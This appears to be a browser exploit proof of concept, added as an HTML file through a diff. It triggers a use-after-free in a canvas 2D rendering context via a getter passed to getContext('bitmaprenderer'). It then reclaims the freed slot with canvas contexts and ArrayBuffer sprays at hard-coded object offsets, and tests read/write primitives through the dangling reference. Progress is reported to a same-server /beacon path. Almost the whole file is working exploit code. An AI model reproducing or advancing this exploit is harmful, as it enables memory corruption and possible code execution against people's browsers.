@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V548</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V548-'+tag+'?d='+encodeURIComponent(data)+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      innerCtx.lineWidth=11111.11111;
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return {ctx:innerCtx, canvas:outer};
+}
+
+b('BOOT','V548-alias-twostage');
+
+// T1: Alias identification via lineWidth marker
+// UAF → same-type reclaim with unique lineWidths → write through dangling → find alias
+(function T1(){
+  b('T1-START','alias identification');
+  var uaf=triggerUAF();
+  var ctx=uaf.ctx;
+
+  var ctxs=[];
+  var cans=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    var newctx=c.getContext('2d');
+    newctx.lineWidth=i+1;
+    ctxs.push(newctx);
+    cans.push(c);
+  }
+  b('T1-RECLAIM','200 contexts with unique lw');
+
+  // Read lineWidth through dangling ref — should show reclaiming context's value
+  var lwBefore=ctx.lineWidth;
+  b('T1-LW-BEFORE','val='+lwBefore);
+
+  // Write through dangling ref
+  ctx.lineWidth=12345.6789;
+  var lwAfter=ctx.lineWidth;
+  b('T1-LW-AFTER','set=12345.6789 read='+lwAfter);
+
+  // Find which new context has 12345.6789
+  var found=-1;
+  for(var i=0;i<ctxs.length;i++){
+    if(ctxs[i].lineWidth===12345.6789){
+      found=i;
+      break;
+    }
+  }
+  if(found>=0){
+    b('T1-ALIAS','ctx['+found+'] has 12345.6789! (was lw='+(found+1)+')');
+  }else{
+    b('T1-NO-ALIAS','no context has 12345.6789');
+    // Check dangling ref value
+    var sample=[];
+    for(var i=0;i<10;i++)sample.push(i+':'+ctxs[i].lineWidth);
+    b('T1-SAMPLE',sample.join(','));
+    // Also check: maybe none reclaimed (lineWidth still 11111.11111)
+    b('T1-DANG-LW','dangling='+ctx.lineWidth);
+  }
+
+  // Keep refs alive for T2
+  window._t1={ctx:ctx, ctxs:ctxs, cans:cans, found:found};
+})();
+
+// T2: Two-stage exploit — same-type reclaim → identify → re-free → AB spray
+// Tests if GC crash happens when we replace a previously-valid context with AB
+(function T2(){
+  b('T2-START','two-stage: reclaim, re-free, AB spray');
+  var uaf=triggerUAF();
+  var ctx=uaf.ctx;
+
+  // Stage 1: same-type reclaim
+  var ctxs=[];
+  var cans=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    var newctx=c.getContext('2d');
+    newctx.lineWidth=i+1;
+    ctxs.push(newctx);
+    cans.push(c);
+  }
+  b('T2-RECLAIM','200 contexts');
+
+  // Verify dangling ref works
+  var lw1=ctx.lineWidth;
+  b('T2-LW1','val='+lw1);
+
+  // Stage 2: null ALL refs to new contexts+canvases to allow GC to free them
+  // This should re-free the slot that ctx points to
+  for(var i=0;i<200;i++){
+    cans[i].width=0; // detach rendering context
+    cans[i]=null;
+    ctxs[i]=null;
+  }
+  cans=null;
+  ctxs=null;
+  b('T2-NULLED','all refs cleared');
+
+  // Force GC — allocate and discard lots of objects
+  var junk;
+  for(var g=0;g<10;g++){
+    junk=[];
+    for(var j=0;j<2000;j++)junk.push({a:j,b:'x'.repeat(100)});
+    junk=null;
+  }
+  b('T2-GC','gc pressure done');
+
+  // Check if dangling ref still reads valid data or crashes
+  try{
+    var lw2=ctx.lineWidth;
+    b('T2-LW2','after GC: val='+lw2);
+  }catch(e){b('T2-LW2-ERR',e.message)}
+
+  // Stage 3: AB spray to reclaim the (hopefully) re-freed slot
+  var abs=[];
+  for(var i=0;i<300;i++){
+    var ab=new ArrayBuffer(768);
+    var dv=new DataView(ab);
+    // Write recognizable lineWidth at State+48 = inline buffer + 48
+    // Inline buffer starts at +128 from object start (m_stateStack header 16B at +112, inline at +128)
+    // So lineWidth at +128+48 = +176
+    dv.setFloat64(176,77777.77777,true);
+    // ALSO set m_size=1 at +124 so state() doesn't CrashOnOverflow
+    dv.setUint32(124,1,true);
+    abs.push(ab);
+  }
+  b('T2-SPRAY','300 ABs with lw=77777 at off176');
+
+  // Try reading lineWidth — if two-stage worked and the slot has AB data,
+  // the old m_stateStack.m_buffer might still point to the inline buffer area
+  // (which is now AB data at offset 128+)
+  // lineWidth = m_buffer[0].lineWidth = *(double*)(m_buffer + 48)
+  // If m_buffer still = old inline buffer addr = object_addr + 128
+  // Then reads from AB[176] = 77777.77777
+  try{
+    var lw3=ctx.lineWidth;
+    b('T2-LW3','!!!val='+lw3+'!!!');
+  }catch(e){b('T2-LW3-ERR',e.message)}
+})();
+
+// T3: save() write detection with same-type reclaim (NOT AB spray)
+// Use save() to write m_unrealizedSaveCount, then read it through the alias
+(function T3(){
+  b('T3-START','save write via same-type');
+  var uaf=triggerUAF();
+  var ctx=uaf.ctx;
+
+  // Same-type reclaim
+  var ctxs=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    ctxs.push(c.getContext('2d'));
+  }
+
+  // Read m_unrealizedSaveCount indirectly:
+  // Call save() through dangling ref, then call save() through alias
+  // If they share the same object, the count accumulates
+  ctx.save();
+  ctx.save();
+  ctx.save();
+  b('T3-SAVED','3 saves through dangling');
+
+  // Now find the alias and check its state
+  // Set a marker through dangling
+  ctx.lineWidth=54321.12345;
+  var found=-1;
+  for(var i=0;i<ctxs.length;i++){
+    if(ctxs[i].lineWidth===54321.12345){
+      found=i;
+      break;
+    }
+  }
+  if(found>=0){
+    b('T3-ALIAS','ctx['+found+']');
+    // Try restore through alias — should pop the 3 unrealized saves
+    try{
+      ctxs[found].restore();
+      b('T3-RESTORE','ok through alias');
+      // Check lineWidth — if restore works, it restores the state before our marker
+      var lw=ctxs[found].lineWidth;
+      b('T3-LW-POST','val='+lw+' (expect 1 if restore popped our save)');
+    }catch(e){b('T3-RESTORE-ERR',e.message)}
+  }else{
+    b('T3-NO-ALIAS','no alias found');
+  }
+})();
+
+// T4: Transform read/write — AffineTransform at State+112 (6 doubles, 48B)
+// This is the LARGEST contiguous writable field through the canvas API
+(function T4(){
+  b('T4-START','transform R/W');
+  var uaf=triggerUAF();
+  var ctx=uaf.ctx;
+
+  // Same-type reclaim
+  var ctxs=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    ctxs.push(c.getContext('2d'));
+  }
+
+  // Write transform through dangling ref
+  // setTransform(a, b, c, d, e, f) sets the AffineTransform
+  ctx.setTransform(1.1, 2.2, 3.3, 4.4, 5.5, 6.6);
+
+  // Read it back through dangling ref
+  try{
+    var t=ctx.getTransform();
+    b('T4-XFORM','a='+t.a+',b='+t.b+',c='+t.c+',d='+t.d+',e='+t.e+',f='+t.f);
+  }catch(e){b('T4-XFORM-ERR',e.message)}
+
+  // Find alias and verify transform visible through it
+  ctx.lineWidth=98765.4321;
+  var found=-1;
+  for(var i=0;i<ctxs.length;i++){
+    if(ctxs[i].lineWidth===98765.4321){
+      found=i;
+      break;
+    }
+  }
+  if(found>=0){
+    try{
+      var t2=ctxs[found].getTransform();
+      b('T4-ALIAS-XFORM','a='+t2.a+',b='+t2.b+',c='+t2.c+',d='+t2.d+',e='+t2.e+',f='+t2.f);
+    }catch(e){b('T4-ALIAS-XFORM-ERR',e.message)}
+  }else{
+    b('T4-NO-ALIAS','no alias found');
+  }
+})();
+
+// T5: miterLimit read/write test (State+64)
+(function T5(){
+  b('T5-START','miterLimit R/W');
+  var uaf=triggerUAF();
+  var ctx=uaf.ctx;
+
+  var ctxs=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    ctxs.push(c.getContext('2d'));
+  }
+
+  ctx.miterLimit=42.42;
+  var ml=ctx.miterLimit;
+  b('T5-ML','set=42.42 read='+ml);
+
+  // Also test globalAlpha (State+96)
+  ctx.globalAlpha=0.12345;
+  var ga=ctx.globalAlpha;
+  b('T5-GA','set=0.12345 read='+ga);
+
+  // Test shadowBlur (State+80, float)
+  ctx.shadowBlur=3.14;
+  var sb=ctx.shadowBlur;
+  b('T5-SB','set=3.14 read='+sb);
+
+  // Test lineDashOffset (State+double)
+  ctx.lineDashOffset=7.77;
+  var ldo=ctx.lineDashOffset;
+  b('T5-LDO','set=7.77 read='+ldo);
+})();
+
+b('DONE','V548-all-complete');
+</script>
+</body></html>
